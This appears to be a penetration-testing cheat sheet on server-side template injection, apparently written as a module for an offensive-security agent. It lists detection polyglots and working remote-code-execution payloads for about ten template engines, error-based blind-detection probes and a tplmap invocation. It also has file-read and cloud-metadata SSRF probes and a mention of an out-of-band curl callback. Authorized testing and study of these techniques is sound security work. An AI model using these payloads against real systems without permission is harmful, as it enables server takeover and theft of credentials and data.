# Moraa — Server-Side Template Injection (→ RCE)

> Load when user input is rendered by a server template (names, bios, subjects, PDF/email/report
> generators, error pages, filenames, invoice fields). SSTI → RCE is a top-tier finding.

## Detect (polyglot first, then confirm engine)
```
${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  ${{7*7}}  #{7*7}  *{7*7}  @(7*7)  {7*7}
polyglot: ${{<%[%'"}}%\   → error patterns reveal the engine
```
`49` back = evaluated → SSTI. Where 49 appears (and which syntax worked) → engine.

## Identify engine → escalate
```
Jinja2 (Python):   {{7*7}}=49, {{7*'7'}}=7777777
  RCE: {{config}} ; {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
       {{cycler.__init__.__globals__.os.popen('id').read()}}  {{request.application.__globals__...}}
Twig (PHP):        {{7*7}}=49, {{7*'7'}}=49
  RCE: {{['id']|filter('system')}}  {{_self.env.registerUndefinedFilterCallback('exec')}}...
Freemarker (Java): ${7*7}=49
  RCE: <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
Velocity (Java):   #set($x=7*7)$x
  RCE: #set($e="e")$e.getClass().forName("java.lang.Runtime")...exec("id")
Smarty (PHP):      {7*7}=49 ; {php}system('id'){/php} (old) ; {system('id')}
ERB (Ruby):        <%= 7*7 %> ; <%= `id` %> ; <%= system('id') %>
Thymeleaf (Java):  ${7*7} ; [[${T(java.lang.Runtime).getRuntime().exec('id')}]] (SpringEL)
Handlebars/Pug/EJS(JS): lookup/constructor chains → require('child_process').execSync('id')
Mako (Python):     ${7*7} ; ${__import__('os').popen('id').read()}
Handlebars (Node): no direct exec syntax — lookup/constructor chain via helpers:
  {{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}
  {{this.push (lookup string.sub "constructor")}}
  {{this.push "return require('child_process').execSync('id');"}}
  {{#with string.split as |codelist|}}{{this.pop}}{{this.push (lookup conslist.0 "apply")}}
  {{this.apply 0 codelist}}{{/with}}{{/with}}{{/with}}{{/with}}
Pug/Jade (Node):   #{ root.process.mainModule.require('child_process').execSync('id').toString() }
```
> **SpEL** (Spring) is adjacent: `#{7*7}`, `T(java.lang.Runtime).getRuntime().exec(...)` in expression
> inputs (search params, SpEL-backed rules). We chased SpEL on acme.example — confirm eval before claiming.

## Blind SSTI
```
time:   {{ '7'*99999999 }} (CPU) or sleep gadget      OOB: RCE that curls your collaborator
error:  malformed template → engine name in stack trace
```

### Error-based detection ("Successful Errors" — PortSwigger Research Top 10 2025 #1, Vladislav
Korchagin) — turns blind SSTI into detectable-without-a-callback
Adapts the classical SQLi error-oracle trick to template engines: instead of needing a math side
effect (`{{7*7}}`) or an OOB callback to prove injection, craft a payload that deliberately breaks
template *parsing* in a way that produces a **distinguishable error message per engine**, then diff
the error response against a baseline (unmodified input). Useful when the app suppresses computed
output (no `49` reflected anywhere) but still leaks a stack trace, a generic 500, or even just a
response-time/response-size delta between "parses fine" and "parse error."
```
# deliberately malformed syntax per engine family — compare response vs a clean baseline request
Jinja2/Python:  {{7*7}${          {%if%}                (unclosed tag / mixed delimiter)
Twig/PHP:       {{7*7}{{         {%%}                    (double-open, empty block)
Freemarker:     ${7*7}${}         <#if>                   (unclosed directive)
Velocity:       #set($x=)         #if()#end                (empty assignment/condition)
Thymeleaf:      ${T(}             [[${}]]                  (unbalanced SpEL bracket)
```
Diff signal to look for, cheapest-first: (1) HTTP status delta (200 baseline vs 500 on malformed
input — the app itself may not otherwise error on anything), (2) response body length delta even
when status is identical (a caught-and-logged exception often changes body size slightly), (3) an
actual leaked engine name/stack frame in the error body (jackpot — confirms engine + version
without any code execution). Polyglot the malform across 2-3 engine families in one probe when you
don't yet know the stack, same discipline as the top-of-file math polyglot. This does NOT replace
proving RCE — it's a cheaper, callback-free way to get from "suspect SSTI" to "confirmed SSTI,
now go find the engine-specific RCE gadget above" on targets that filter/suppress the classic
`{{7*7}}` reflection.

## PDF / doc generators (very common SSTI + SSRF + LFI)
```
Inject template syntax into a field that lands in a generated PDF/HTML → RCE via the template engine;
also test <img src=file:///etc/passwd>, <iframe src=http://169.254.169.254> in the same field (SSRF/LFI).
```

## Method
Polyglot → math confirms → engine-specific probe → minimal RCE PoC (`id`/`whoami` or OOB callback).
Tool: `tplmap -u 'https://T/p?x=*'`. → `validate.md` → `findings/` (show the command output).
